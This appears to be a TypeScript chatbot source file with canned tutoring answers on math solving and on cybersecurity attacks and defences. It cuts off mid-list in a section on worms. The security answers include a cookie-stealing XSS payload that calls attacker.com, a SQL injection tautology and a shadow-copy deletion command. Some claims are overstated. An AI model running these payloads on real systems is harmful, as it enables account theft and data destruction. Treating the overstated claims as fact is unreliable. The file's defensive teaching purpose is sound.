/**
 * Naija AI Hyper-Intelligent Knowledge, Coding & Cybersecurity Engine
 * 
 * Provides deep, dynamic, non-repetitive answers for:
 * 1. Computer Programming & Coding across all languages (Python, JavaScript, TypeScript, React, HTML/CSS, SQL, Java, C++, etc.)
 * 2. Cybersecurity & Ethical Hacking: Comprehensive explanations of how attacks work AND exact defensive code/protocols to prevent them.
 * 3. Academic Curriculum: In-depth coverage across Mathematics, Physics, Chemistry, Biology, English, Economics, Government, etc.
 * 4. Universal Dynamic Inquiry: Intelligent topic analysis for any custom question.
 */

import { generateCustomWebsiteProject, editOrGenerateWebsite, extractLatestHtmlFromChatHistory } from './dynamicWebsiteGenerator';

export interface ChatHistoryItem {
  sender: 'user' | 'tutor';
  text: string;
}

export function generateNaijaAIResponse(
  message: string,
  topic?: string,
  subjectName?: string,
  studentName?: string,
  chatHistory?: ChatHistoryItem[]
): string {
  const q = message.trim().toLowerCase();
  const top = (topic || '').trim().toLowerCase();
  const sub = (subjectName || '').trim().toLowerCase();
  const name = studentName || 'Scholar';

  // Analyze past conversation context to prevent repetition and provide follow-up continuity
  const previousTurns = Array.isArray(chatHistory) 
    ? chatHistory.filter(h => h && typeof h.text === 'string' && h.text.trim()) 
    : [];
  const lastUserTurn = previousTurns.length >= 2 
    ? previousTurns[previousTurns.length - 2]?.text?.toLowerCase() || '' 
    : '';

  // =========================================================================
  // 0. RESET & DEDICATED PURE LEARNING / STUDY FOCUS MODE
  // =========================================================================
  const isGeneralLearningReset = 
    q.includes('back to just learning') || q.includes('back to learning') || 
    q.includes('get back to learning') || q.includes('just learning') || 
    q.includes('focus on learning') || q.includes('focus on study') || 
    q.includes('back to study') || q.includes('back to studying') ||
    q.includes('let us learn') || q.includes("let's learn") || 
    q === 'teach me' || q === 'teach me something' || q === 'let us study' ||
    q.includes('stop editing') || q.includes('stop website');

  if (isGeneralLearningReset) {
    return `### 🎓🇳🇬 Naija AI: Back to Pure Learning & Academic Mastery!

Hello **${name}**! 🚀 We are 100% locked back onto **pure learning, syllabus mastery, and top-tier exam preparation**! No distractions.

---

### ⚡ What We Can Study Right Now:

1. **📐 Mathematics & Calculations:**
   - Quadratic equations & Almighty Formula proofs
   - Simultaneous & linear equations, matrices, and logarithms
   - Trigonometry ($SOH\\ CAH\\ TOA$), circle geometry, and calculus (differentiation & integration)
   - Compound interest, commercial arithmetic, and probability

2. **📖 English Language & Communication:**
   - Grammatical Concord (Subject-Verb agreement, Proximity rule, Either/Or)
   - Oral English: Primary and secondary syllable stress, vowel sounds, and diphthongs
   - Idioms, antonyms, synonyms, and WAEC summary writing strategies

3. **🔬 Sciences (Physics, Chemistry, Biology):**
   - **Physics:** Newton's Laws, kinematics ($v = u + at$), work/energy, electricity ($V=IR$), optics, and waves
   - **Chemistry:** Periodic table trends, stoichiometry, mole calculations, organic chemistry, and redox equations
   - **Biology:** Genetics (Mendel's laws, Punnett squares), cell division (mitosis/meiosis), ecology, and human physiology

4. **💼 Commercial & Arts:**
   - **Economics:** Price elasticity of demand/supply, national income, and market structures
   - **Government:** Nigerian 1999 Constitution, separation of powers, and electoral systems
   - **Literature:** Themes, character analysis, and literary devices in prescribed texts

5. **💻 Computer Science & Coding Foundations:**
   - Python programming concepts (loops, functions, lists, dictionaries, algorithms)
   - Data structures, Big-O notation, and algorithmic problem-solving

---

### 💡 How Would You Like to Start?
* Type any **homework problem** or formula you want solved step-by-step.
* Type a **subject and topic** (e.g. *"Teach me Physics Projectile Motion"*).
* Say *"Quiz me on JAMB Biology"* to test your recall with interactive questions!`;
  }

  // =========================================================================
  // 1. DYNAMIC MATH EQUATION SOLVER (ARITHMETIC, LINEAR & QUADRATIC EQUATIONS)
  // =========================================================================

  // Dynamic Quadratic equation solver: e.g. "solve 2x^2 - 4x - 6 = 0" or "x^2 + 5x + 6 = 0"
  const quadMatch = message.match(/([+-]?\s*\d*)\s*x\^?2\s*([+-]\s*\d*)\s*x\s*([+-]\s*\d+)\s*=\s*0/i);
  if (quadMatch) {
    let aStr = quadMatch[1].replace(/\s+/g, '');
    let a = aStr === '' || aStr === '+' ? 1 : (aStr === '-' ? -1 : parseFloat(aStr));
    let bStr = quadMatch[2].replace(/\s+/g, '');
    let b = bStr === '' || bStr === '+' ? 1 : (bStr === '-' ? -1 : parseFloat(bStr));
    let c = parseFloat(quadMatch[3].replace(/\s+/g, ''));

    const disc = b * b - 4 * a * c;
    let rootsExplanation = '';
    if (disc > 0) {
      const x1 = ((-b + Math.sqrt(disc)) / (2 * a)).toFixed(2);
      const x2 = ((-b - Math.sqrt(disc)) / (2 * a)).toFixed(2);
      rootsExplanation = `Since the discriminant $\\Delta = ${disc} > 0$, there are **two distinct real roots**:\n- **$x_1 = \\frac{-(${b}) + \\sqrt{${disc}}}{2(${a})} = \\mathbf{${x1}}$**\n- **$x_2 = \\frac{-(${b}) - \\sqrt{${disc}}}{2(${a})} = \\mathbf{${x2}}$**`;
    } else if (disc === 0) {
      const x = (-b / (2 * a)).toFixed(2);
      rootsExplanation = `Since the discriminant $\\Delta = 0$, there are **two equal real roots**:\n- **$x = \\frac{-(${b})}{2(${a})} = \\mathbf{${x}}$**`;
    } else {
      rootsExplanation = `Since the discriminant $\\Delta = ${disc} < 0$, there are **no real roots** (the roots are complex conjugates): $x = \\frac{-(${b}) \\pm ${Math.sqrt(-disc).toFixed(2)}i}{${2 * a}}$.`;
    }

    return `### 💡 Naija AI Step-by-Step Quadratic Equation Solution

Hello **${name}**! Here is the complete step-by-step mathematical working using the Quadratic (Almighty) Formula:

**Problem:** Solve $${a === 1 ? '' : a}x^2 ${b >= 0 ? '+ ' + b : '- ' + Math.abs(b)}x ${c >= 0 ? '+ ' + c : '- ' + Math.abs(c)} = 0$

**Step 1: Identify Coefficients:**
- $a = ${a}$, $b = ${b}$, $c = ${c}$

**Step 2: Calculate the Discriminant ($D = b^2 - 4ac$):**
$$D = (${b})^2 - 4(${a})(${c}) = ${b * b} - (${4 * a * c}) = \\mathbf{${disc}}$$

**Step 3: Apply the Almighty Formula:**
$$x = \\frac{-b \\pm \\sqrt{b^2 - 4ac}}{2a} = \\frac{-(${b}) \\pm \\sqrt{${disc}}}{2(${a})}$$

**Step 4: Final Calculated Roots:**
${rootsExplanation}

**Examiner Tip:** In JAMB & WAEC, if asked for the *sum of roots* $(\\alpha + \\beta)$, simply compute $-\\frac{b}{a} = ${(-b / a).toFixed(2)}$. For the *product of roots* $(\\alpha\\beta)$, compute $\\frac{c}{a} = ${(c / a).toFixed(2)}$!`;
  }

  // Conceptual / How-to: Quadratic Equations (Factorization, Almighty Formula, Completing the Square)
  if (q.includes('quadratic') && (q.includes('solve') || q.includes('formula') || q.includes('equation') || q.includes('teach') || q.includes('how to') || q.includes('method') || q.includes('explain'))) {
    return `### 📐💡 Naija AI Masterclass: How to Solve Quadratic Equations ($ax^2 + bx + c = 0$)

Hello **${name}**! Quadratic equations are tested in almost every single JAMB UTME, WAEC SSCE, and NECO Mathematics paper. Here is the complete masterclass:

---

### 1. ⚡ The Three Core Methods to Solve Any Quadratic Equation:

#### Method A: The Quadratic Formula (The "Almighty Formula")
Works on **100% of all quadratic equations**, even when numbers cannot be factorized nicely!
$$x = \\frac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}$$

**Worked Example:** Solve $2x^2 + 5x - 3 = 0$
- $a = 2$, $b = 5$, $c = -3$
- Discriminant: $D = b^2 - 4ac = (5)^2 - 4(2)(-3) = 25 - (-24) = \\mathbf{49}$
- Substitute into formula:
  $$x = \\frac{-(5) \\pm \\sqrt{49}}{2(2)} = \\frac{-5 \\pm 7}{4}$$
- Two Roots:
  - $x_1 = \\frac{-5 + 7}{4} = \\frac{2}{4} = \\mathbf{0.5}$
  - $x_2 = \\frac{-5 - 7}{4} = \\frac{-12}{4} = \\mathbf{-3}$

---

#### Method B: The Factorization Method
Fastest method when two numbers multiply to $ac$ and add up to $b$.
- For $x^2 - 5x + 6 = 0$:
  - Factors of $6$ that add to $-5$ are $-2$ and $-3$.
  - $(x - 2)(x - 3) = 0 \\implies \\mathbf{x = 2 \\text{ or } x = 3}$.

---

### 2. 🎯 High-Yield JAMB & WAEC Examiner Shortcuts:
* **Sum of Roots $(\\alpha + \\beta)$:**
  $$\\alpha + \\beta = -\\frac{b}{a}$$
* **Product of Roots $(\\alpha\\beta)$:**
  $$\\alpha\\beta = \\frac{c}{a}$$
* **Forming a Quadratic from Roots $\\alpha$ and $\\beta$:**
  $$x^2 - (\\alpha + \\beta)x + (\\alpha\\beta) = 0$$
* **Nature of Roots (The Discriminant $\\Delta = b^2 - 4ac$):**
  - If $\\Delta > 0$: **Two real and distinct roots**.
  - If $\\Delta = 0$: **Two real and equal roots** (perfect square).
  - If $\\Delta < 0$: **No real roots** (complex conjugate roots).

Want to solve a specific equation? Just type it, e.g. *"solve 3x^2 - 7x + 2 = 0"*!`;
  }

  // Dynamic Linear equation solver: e.g. "solve 3x + 9 = 24" or "solve 5x - 10 = 15"
  const linMatch = message.match(/([0-9]*)\s*x\s*([\+\-])\s*([0-9]+)\s*=\s*([0-9]+)/i);
  if (linMatch && (q.includes('solve') || q.includes('='))) {
    const a = parseInt(linMatch[1] || '1', 10);
    const sign = linMatch[2];
    const b = parseInt(linMatch[3], 10);
    const c = parseInt(linMatch[4], 10);
    const targetC = sign === '+' ? c - b : c + b;
    const xVal = targetC / a;

    return `### 💡 Naija AI Step-by-Step Math Solution

Hello **${name}**! Here is the step-by-step solution for your linear equation:

**Problem:** Solve $${a === 1 ? '' : a}x ${sign} ${b} = ${c}$

**Step 1: Collect like terms (isolate the $x$-term):**
Move the constant $${b}$ to the right-hand side (remember: sign changes when crossing the equals sign):
$$${a === 1 ? '' : a}x = ${c} ${sign === '+' ? '-' : '+'} ${b}$$
$$${a === 1 ? '' : a}x = ${targetC}$$

**Step 2: Divide both sides by the coefficient of $x$ ($${a}$):**
$$x = \\frac{${targetC}}{${a}} = \\mathbf{${xVal}}$$

**Step 3: Verification Check:**
Substitute $x = ${xVal}$ back into the original equation:
$${a}(${xVal}) ${sign} ${b} = ${a * xVal} ${sign} ${b} = ${c}$ ✅ (LHS = RHS)

**JAMB/WAEC Tip:** Always substitute your calculated answer back into the question to verify accuracy under exam time pressure!`;
  }

  // =========================================================================
  // 2. CYBERSECURITY, HACKING MECHANICS & DEFENSIVE ENGINEERING
  // (EXPLAINING HOW ATTACKS WORK & THE EXACT PREVENTATIVE CODE)
  // =========================================================================

  // Specific: Mobile Games, EA FC Mobile / FIFA, Free Currency & "Point Hack" Inquiries
  if (
    q.includes('fc mobile') || q.includes('fifa mobile') || q.includes('fc point') || q.includes('fifa point') ||
    q.includes('20k fc') || q.includes('fc 24') || q.includes('fc 25') ||
    q.includes('robux') || q.includes('free fire') || q.includes('diamond hack') || q.includes('pubg uc') || q.includes('codm cp') ||
    ((q.includes('game') || q.includes('coin') || q.includes('point') || q.includes('gem') || q.includes('unlimited') || q.includes('mod apk')) && (q.includes('hack') || q.includes('generator') || q.includes('cheat')))
  ) {
    return `### 🎮 Naija AI Gaming & Cybersecurity: The Truth About FC Mobile Points & Currency Hacks

Hello **${name}**! Here is the honest, technical reality of how game currencies work in **EA Sports FC Mobile (and mobile games)**, why "20k point generator hacks" are scams, and the legitimate ways to build a world-class squad:

**⚡ Quick Key Takeaway:**
There is **no functional hack, cheat, or generator that can inject 20,000 FC Points into your FC Mobile account**. FC Points are stored on **EA Sports' central cloud servers (server-authoritative)**, not inside your phone. 100% of websites, YouTube videos, and Telegram channels promising "free 20k FC Points hacks" are phishing scams or malware designed to steal your account or phone data.

---

### 1. ⚙️ Technical Architecture: Why Client Hacks Cannot Generate FC Points
* **Server-Authoritative vs Client-Side Storage:**
  - Games like offline Subway Surfers store coin values locally on your device in plain SQLite or shared preferences, which simple memory editors (like GameGuardian) could modify.
  - In **EA Sports FC Mobile**, your FC Points, Gems, and player inventory exist strictly in **EA's encrypted server database (Amazon AWS / Origin servers)**.
  - When you launch a pack or purchase a player, your phone sends a cryptographically signed transaction token to EA's server. The server verifies your actual balance before granting the items.
* **The "Visual Mod" Trap:**
  - Modded APKs or memory editors only change the visual number displayed on your local screen (e.g. showing 20,000 on your device). As soon as you tap "Open Pack", the server checks your real balance, detects a mismatch, and throws an error (**Transaction Failed / Server Sync Error 0x8201**).

---

### 2. ⚠️ The Cybersecurity Dangers of "Point Generator" & "Hack" Sites:
1. **Account Phishing & Stealer Syndicates:**
   - Fake generator websites ask for your EA Account, Google Play, or Facebook login and password. The moment you type them, automated bots log in, transfer your tradeable players, sell your coins, and lock you out permanently.
2. **Trojanized Mod APKs (Spyware):**
   - Downloadable "FC 24/25 Unlimited Points Mod APKs" frequently contain Android banking trojans (like SpyNote or Joker) that monitor keystrokes, intercept SMS banking OTPs, and drain mobile wallets.
3. **Endless Human Verification Surveys:**
   - Fake generator pages make you download apps or complete endless surveys "for verification." Scammers pocket $1–$5 per survey while you get absolutely zero FC Points.
4. **Permanent Device & Account Bans:**
   - EA Sports uses Google Play Integrity API and server-side heuristics. Using tampered APKs results in an immediate, permanent ban on your EA UID and hardware IMEI blacklist.

---

### 3. 🏆 Legitimate, High-Yield Strategies to Get Millions of Coins & High OVR in FC Mobile:
* **Max Out Star Pass & Daily Quests:**
  - Complete all daily and weekly skill quests to earn thousands of free gems and Star Pass rewards.
* **Convert Free Gems to Ultra Packs:**
  - Save 3,000–7,500 gems to open event Ultra Packs (TOTY, TOTS, Champions League) where pack weight for untradeables is significantly higher.
* **Transfer Market Flipping & Investment:**
  - Buy high-demand 88–92 OVR fodder cards on Sunday nights when prices crash from weekend pack openings, and resell them on Thursday/Friday when Weekend Challenge requirements launch.
* **Play All Live Events & Icon Journeys:**
  - Never skip event daily matches. Free event cards (Zidane, Gullit, Maldini journey milestones) rival the stats of paid store cards.
* **Official Promotions:**
  - If buying FC Points, purchase strictly through the official in-app Google Play Store, Apple Store, or the authorized EA Webstore with regional discounts.`;
  }


  // Specific: Wi-Fi Hacking & Defense
  if (q.includes('wifi') || q.includes('wi-fi') || q.includes('router') || q.includes('handshake') || q.includes('aircrack')) {
    return `### 🛡️ Naija AI Cybersecurity Masterclass: How Wi-Fi Hacking Works & How to Prevent It

Hello **${name}**! Here is an objective, technical breakdown of how wireless network attacks operate and the exact defensive protocols required to secure them:

**⚡ Quick Key Takeaway:**
Wi-Fi attacks target unencrypted channels, weak pre-shared keys (WPA2-PSK), and insecure router configurations (WPS PINs). By transitioning to **WPA3-SAE**, enforcing complex 16+ character passphrases, disabling WPS, and using VPNs, Wi-Fi networks can be made virtually impenetrable.

---

### 1. How Wi-Fi Attacks Work Technically:
* **WPA2 4-Way Handshake Capture:** When a phone connects to a Wi-Fi router, an EAPOL 4-way authentication handshake occurs. Attackers send 802.11 deauthentication packets to temporarily disconnect the client; when the client reconnects, the attacker captures the handshake containing the cryptographic hash of the Wi-Fi password.
* **Offline Dictionary Attack:** The captured handshake is run through wordlists (e.g. \`rockyou.txt\`) using GPU-accelerated hash crackers (Hashcat). If the Wi-Fi password is a simple phone number or dictionary word, it is cracked in seconds.
* **Evil Twin / Rogue AP:** Attackers create a fake Wi-Fi hotspot with the exact same SSID name as a school or cafe, broadcasting at higher power. When victims connect, all unencrypted traffic flows through the attacker's machine.

---

### 2. 🛡️ How to PREVENT and Secure Your Wi-Fi Network:
1. **Enable WPA3-Personal (SAE):**
   - WPA3 replaces the flawed WPA2 handshake with **Simultaneous Authentication of Equals (SAE)**. Even if an attacker captures authentication frames, offline dictionary attacks are mathematically impossible.
2. **Disable WPS (Wi-Fi Protected Setup):**
   - The 8-digit WPS PIN can be brute-forced in under 4 hours using Pixie-Dust attacks. Always switch off WPS in router admin settings.
3. **Use Long, High-Entropy Passphrases (16+ Characters):**
   - Never use phone numbers, birthdays, or single words. Use 4-5 random words: \`correct-horse-battery-staple-99!\`.
4. **Isolate Guest Networks & Enforce Client Isolation:**
   - Ensure visitors cannot see or communicate with internal smart devices or testing servers.
5. **Always Use Encrypted VPNs & HTTPS on Public Wi-Fi:**
   - Encrypts all OSI Layer 4-7 traffic from your device to the secure tunnel endpoint.

*Statutory Notice: Unauthorized wireless packet interception violates Section 6 of the Nigerian Cybercrimes Act 2015.*`;
  }

  // Specific: DDoS Attacks & Mitigation
  if (q.includes('ddos') || /\bdos\b/i.test(q) || q.includes('denial of service') || q.includes('botnet') || q.includes('flood')) {
    return `### 🛡️ Naija AI Cybersecurity Masterclass: How DDoS Attacks Work & How to Prevent Them

Hello **${name}**! Here is an exhaustive breakdown of Distributed Denial of Service (DDoS) mechanics and modern enterprise defense:

**⚡ Quick Key Takeaway:**
DDoS attacks overwhelm a target server's CPU, memory, or network bandwidth using thousands of compromised IoT botnets. Preventing DDoS requires **Anycast Edge CDNs (e.g. Cloudflare)**, SYN cookies, algorithmic rate limiting, and upstream traffic scrubbing.

---

### 1. How DDoS Attacks Work:
* **SYN Flood (Layer 4 Attack):** Attackers send millions of TCP SYN packets with spoofed source IPs. The server allocates memory in its connection backlog waiting for ACK responses that never come, causing legitimate requests to time out.
* **UDP & NTP/DNS Amplification (Layer 3/4):** Attackers send tiny requests to misconfigured DNS/NTP servers with the victim's spoofed IP address. The servers reply with 50x larger responses directly to the victim, saturating their bandwidth.
* **HTTP Flood (Layer 7 Application Attack):** Thousands of automated bots send complex POST requests or database-heavy search queries (e.g. \`/api/search?q=*\`), exhausting server worker threads and database pools.

---

### 2. 🛡️ How to PREVENT and Mitigate DDoS Attacks:
1. **Edge CDN & Anycast Routing:**
   - Route traffic through globally distributed CDN networks (Cloudflare, AWS CloudFront). Anycast distributes malicious traffic across 300+ global data centers rather than hitting a single origin server.
2. **SYN Cookies in Linux Kernel:**
   - Enable SYN cookies (\`net.ipv4.tcp_syncookies = 1\`) so the server does not allocate memory for connections until the three-way TCP handshake is fully validated.
3. **Application-Layer Rate Limiting (Express / Node.js Implementation):**
\`\`\`javascript
const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute window
  max: 60, // Limit each IP to 60 requests per minute
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests. Please slow down.' }
});

app.use('/api/', apiLimiter);
\`\`\`
4. **Web Application Firewall (WAF) & Behavioral Heuristics:**
   - Challenge suspicious visitors with automated Javascript challenges (Turnstile or CAPTCHA) before allowing requests through.`;
  }

  // Specific: SQL Injection
  if (q.includes('sql injection') || q.includes('sqli') || (q.includes('sql') && q.includes('hack'))) {
    return `### 🛡️ Naija AI Cybersecurity Masterclass: SQL Injection Attack & Defense

Hello **${name}**! Here is an objective, technical breakdown of **SQL Injection (SQLi)** and the exact secure code required to prevent it:

**⚡ Quick Key Takeaway:**
SQL Injection occurs when user-supplied input is directly concatenated into a SQL statement, allowing attackers to manipulate query logic. Preventing SQLi is 100% achievable by **always using Parameterized Queries (Prepared Statements)** or Object-Relational Mappers (ORMs).

---

### 1. How SQL Injection Works:
* When developers write dynamically concatenated SQL queries:
\`\`\`sql
-- VULNERABLE SQL QUERY:
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
\`\`\`
Because \`'1'='1'\` is a mathematical identity that evaluates to TRUE, the database evaluates the entire condition as true and authenticates the attacker without a password.

* **Union-Based & Blind Extraction:** Attackers use \`UNION SELECT\` statements to extract entire credit card or password tables into public response pages.

---

### 2. 🛡️ How to PREVENT SQL Injection (The Secure Code):

\`\`\`python
# SECURE PYTHON (SQLite / PostgreSQL Parameterization):
import sqlite3

conn = sqlite3.connect("database.db")
cursor = conn.cursor()

# SECURE: The '?' placeholder treats input purely as data literals, NEVER executable code
cursor.execute(
    "SELECT id, username, role FROM users WHERE username = ? AND password_hash = ?",
    (user_input, hashed_password)
)
user = cursor.fetchone()
\`\`\`

\`\`\`javascript
// SECURE NODE.JS (pg / mysql2 prepared statements):
const query = 'SELECT id, email, role FROM users WHERE email = $1';
const result = await db.query(query, [userEmail]); // Safe parameterized query
\`\`\`

**Core Rules:**
1. Never concatenate strings into SQL queries.
2. Enforce the Principle of Least Privilege: The database user connecting from the web app should not have \`DROP TABLE\` or \`ADMIN\` permissions.`;
  }

  // Specific: Cross-Site Scripting (XSS)
  if (q.includes('xss') || q.includes('cross site scripting') || q.includes('cross-site scripting')) {
    return `### 🛡️ Naija AI Cybersecurity Masterclass: Cross-Site Scripting (XSS) & Defense

Hello **${name}**! Here is an exhaustive breakdown of Cross-Site Scripting (XSS) mechanics and modern web defenses:

**⚡ Quick Key Takeaway:**
XSS occurs when untrusted user input is rendered into a webpage's DOM without proper HTML encoding or sanitization, executing malicious JavaScript in victims' browsers. Prevention requires **Context-Aware Escaping**, **DOMPurify**, **Content Security Policy (CSP)**, and **HttpOnly cookie flags**.

---

### 1. The 3 Types of XSS Attacks:
* **Stored XSS:** Malicious payload is permanently saved in the database (e.g. comment field) and executes whenever anyone views the page:
\`\`\`html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
\`\`\`
* **Reflected XSS:** Payload is passed in URL query parameters (e.g. \`?search=<script>...\`) and echoed back by the server.
* **DOM-based XSS:** Client-side JavaScript unsafely writes to the document using \`innerHTML\`, \`eval()\`, or \`document.write()\`.

---

### 2. 🛡️ How to PREVENT XSS (The Solution):
1. **Always Use Safe DOM Sinks in Frontend:**
   - In React: React automatically escapes strings inside JSX (\`<div>{userInput}</div>\`). Never use \`dangerouslySetInnerHTML\` without sanitization.
   - In Vanilla JS: Use \`element.textContent = userInput\` instead of \`element.innerHTML\`.
2. **Sanitize with DOMPurify:**
\`\`\`javascript
import DOMPurify from 'dompurify';
const cleanHtml = DOMPurify.sanitize(userSubmittedHtml);
\`\`\`
3. **Set HttpOnly on Session Cookies:**
\`\`\`http
Set-Cookie: sessionId=xyz123; Secure; HttpOnly; SameSite=Strict
\`\`\`
*(When HttpOnly is active, malicious JavaScript cannot read \`document.cookie\` even if an XSS vulnerability exists).*
4. **Deploy a Strict Content Security Policy (CSP):**
\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
\`\`\``;
  }

  // Specific: Password Cracking & Brute Force
  if (q.includes('password') && (q.includes('crack') || q.includes('hack') || q.includes('hash') || q.includes('brute') || q.includes('bcrypt'))) {
    return `### 🛡️ Naija AI Cybersecurity Masterclass: Password Cracking & Cryptographic Defense

Hello **${name}**! Here is how password cracking operates and how modern developers secure user credentials:

**⚡ Quick Key Takeaway:**
Attackers crack passwords by computing hashes of massive wordlists (dictionary attacks) or trying all permutations (brute force) using GPU clusters. Fast hash algorithms (MD5, SHA1, SHA256) are easily cracked. Developers must **always use adaptive, salted, memory-hard algorithms like bcrypt or Argon2id**.

---

### 1. How Password Cracking Works:
* **Pre-Computed Rainbow Tables:** If passwords are saved as simple hashes (e.g. \`md5("password123")\`), attackers instantly look up the plaintext from pre-computed tables.
* **GPU Hashcat Cracking:** High-end GPUs can compute over 100 billion SHA-256 hashes per second. Weak passwords are cracked in milliseconds.

---

### 2. 🛡️ How to PREVENT Password Cracking (The Secure Implementation):

\`\`\`python
# SECURE PYTHON PASSWORD HASHING USING BCRYPT
import bcrypt

# 1. Hashing: Generates a cryptographically random salt and applies cost factor 12
password = "ScholarSecurePass2027!".encode('utf-8')
salt = bcrypt.gensalt(rounds=12) # 2^12 = 4,096 iterations
hashed_pw = bcrypt.hashpw(password, salt)

# 2. Verification on Login: Constant-time comparison to defeat timing attacks
candidate_pw = "ScholarSecurePass2027!".encode('utf-8')
is_valid = bcrypt.checkpw(candidate_pw, hashed_pw)

print("Password Authenticated:", is_valid)
\`\`\`

**Defensive Best Practices:**
1. **Never roll your own crypto:** Never use custom XOR or simple hashing functions.
2. **Cost Factor Tuning:** Bcrypt rounds should be configured to take ~250ms on your server hardware, making offline brute forcing computationally infeasible for attackers.
3. **Multi-Factor Authentication (MFA):** Require TOTP authenticator codes (Google Authenticator) so a leaked password alone is insufficient for access.`;
  }

  // Specific: Phishing & Social Engineering
  if (q.includes('phish') || q.includes('social engineering') || q.includes('scam') || q.includes('spoof')) {
    return `### 🛡️ Naija AI Cybersecurity Masterclass: Phishing & Social Engineering Defense

Hello **${name}**! Here is an objective analysis of phishing attack vectors and effective defensive countermeasures:

**⚡ Quick Key Takeaway:**
Phishing manipulates human trust rather than system code, using spoofed emails and clone websites to harvest credentials. Defense requires **Multi-Factor Authentication (WebAuthn / FIDO2)**, **Email DNS Authentication (DMARC, SPF, DKIM)**, and user awareness.

---

### 1. Phishing Vectors:
* **Clone Phishing / Typosquatting:** Registering domains like \`jamb-portal-ng.com\` instead of the authentic \`jamb.gov.ng\`, copying the styling byte-for-byte to harvest student registration PINs.
* **Email Spoofing:** Sending emails claiming an urgent exam cancellation or bank account suspension with a link to an attacker-controlled portal.

---

### 2. 🛡️ Defensive Technical Controls:
1. **DNS Email Security:**
   - **SPF (Sender Policy Framework):** Specifies which IP addresses are authorized to send email for your domain.
   - **DKIM (DomainKeys Identified Mail):** Cryptographically signs emails to verify they were not altered in transit.
   - **DMARC:** Enforces \`p=reject\` so unauthorized spoofed emails are rejected by Gmail/Outlook.
2. **Hardware Security Keys (WebAuthn / FIDO2):**
   - Cryptographically binds authentication to the true origin domain (e.g. \`studynaija.com\`). Even if a user enters credentials on a fake phishing site, the hardware key refuses to sign the authentication challenge.`;
  }

  // Specific: Man-in-the-Middle (MITM) & ARP Spoofing
  if (q.includes('mitm') || q.includes('man in the middle') || /\barp\b/i.test(q) || q.includes('sniff')) {
    return `### 🛡️ Naija AI Cybersecurity Masterclass: Man-in-the-Middle (MITM) & Transport Security

Hello **${name}**! Here is how Man-in-the-Middle (MITM) attacks occur and how modern encryption defeats them:

**⚡ Quick Key Takeaway:**
MITM attacks intercept communications between a client and server (e.g. on public Wi-Fi). Enforcing **HTTPS with TLS 1.3**, **HSTS**, and **Certificate Pinning** mathematically prevents attackers from decrypting or tampering with transmitted data.

---

### 1. How MITM Attacks Work:
* **ARP Poisoning:** On local networks, an attacker sends fake ARP replies claiming their MAC address belongs to the router gateway. All outbound network traffic is funneled through the attacker's computer.
* **SSL Stripping:** Attackers downgrade \`https://\` requests to unencrypted \`http://\`, intercepting passwords in plaintext.

---

### 2. 🛡️ How to PREVENT MITM Attacks:
1. **HTTP Strict Transport Security (HSTS):**
   Add this HTTP header so browsers refuse to connect over insecure HTTP:
   \`\`\`http
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
   \`\`\`
2. **TLS 1.3 Cipher Suites:** Modern TLS 1.3 eliminates obsolete, vulnerable ciphers and mandates Perfect Forward Secrecy (PFS).
3. **Mobile Certificate Pinning:** In Android/iOS apps, hardcode the public key hash of your backend SSL certificate to prevent rogue proxy inspection tools.`;
  }

  // Specific: Ransomware & Malware
  if (q.includes('ransomware') || q.includes('malware') || q.includes('trojan') || (q.includes('virus') && !q.includes('biology'))) {
    return `### Ransomware & Malware: Infection Mechanics & Disaster Recovery

**Ransomware** and advanced malware silently infiltrate operating systems, encrypt user files using hybrid asymmetric (RSA-4096) and symmetric (AES-256) cryptography, and attempt to delete local shadow copies to extort targets.

---

### 1. How Malware & Ransomware Operate:
1. **Initial Access:** Infiltration via weaponized email attachments, brute-forced Remote Desktop (RDP) ports, or software supply-chain vulnerabilities.
2. **Payload Execution:** Generates an ephemeral AES-256 key to encrypt files at hardware speed, then encrypts that AES key with the attacker's public RSA key.
3. **Backup Destruction:** Automatically runs commands like \`vssadmin delete shadows /all /quiet\` to destroy local restore points.

---

### 2. Prevention & Incident Defense:
1. **The 3-2-1 Air-Gapped Backup Strategy:** Maintain 3 copies of all critical data across 2 separate media types, with 1 copy strictly offline/air-gapped.
2. **Endpoint Detection & Response (EDR):** Deploy behavioral heuristics that detect rapid mass file renaming or unauthorized cryptographic system calls.
3. **Attack Surface Reduction:** Disable legacy SMBv1, block inbound management ports at firewall edges, and enforce Multi-Factor Authentication.`;
  }

  // Specific: Computer Worms (Performance, Propagation, Exploits & Defense)
  if (
    q.includes('worm') || 
    q.includes('computer worm') || 
    q.includes('network worm') || 
    q.includes('wannacry') || 
    q.includes('morris worm') || 
    q.includes('stuxnet')
  ) {
    return `### Computer Worms: Architecture, Performance & Propagation

A **computer worm** is a standalone, self-replicating malware program that spreads autonomously across computer networks without requiring human intervention or a host executable (unlike a computer virus, which must attach itself to an existing file and requires a user to launch it).

---

### 1. How a Computer Worm Performs & Propagates (Lifecycle)

A worm operates through an automated 5-stage execution loop:

1. **Reconnaissance & Network Scanning (Target Identification):**
   - The worm generates ranges of IP addresses (random internet subnets or local private ranges like \`192.168.x.x\` and \`10.x.x.x\`).
   - It executes high-speed port scanning to find listening network services known to contain unpatched remote vulnerabilities (e.g., SMB port 445, RPC port 135, RDP port 3389, WebLogic/HTTP ports).

2. **Vulnerability Exploitation (The Breach):**
   - Once a listening port is discovered, the worm delivers a weaponized exploit packet (such as a buffer overflow, memory corruption, or remote code execution flaw).
   - *Example:* The **WannaCry** worm exploited the **EternalBlue** vulnerability (MS17-010) in Windows SMBv1 to execute arbitrary shellcode directly over the wire without credentials.

3. **Payload Delivery & Local Execution:**
   - The exploit shellcode commands the compromised system to download the main worm binary via HTTP/TFTP or transfers it directly across the socket.
   - The worm executes in memory or writes to disk, ensuring persistence via registry Run keys, scheduled tasks, or Windows system services.

4. **Autonomous Self-Replication (Exponential Proliferation):**
   - The newly infected host is immediately converted into an active attack and scanning node.
   - If one infected machine scans 100 hosts per second, and each infected machine does the same, the infection spreads exponentially across corporate intranets or the global internet in minutes (e.g., the **SQL Slammer** worm doubled in size every 8.5 seconds in 2003).

5. **Secondary Actions / Payload Execution:**
   - Modern worms carry secondary payloads:
     - **Ransomware extortion** (e.g., WannaCry, NotPetya)
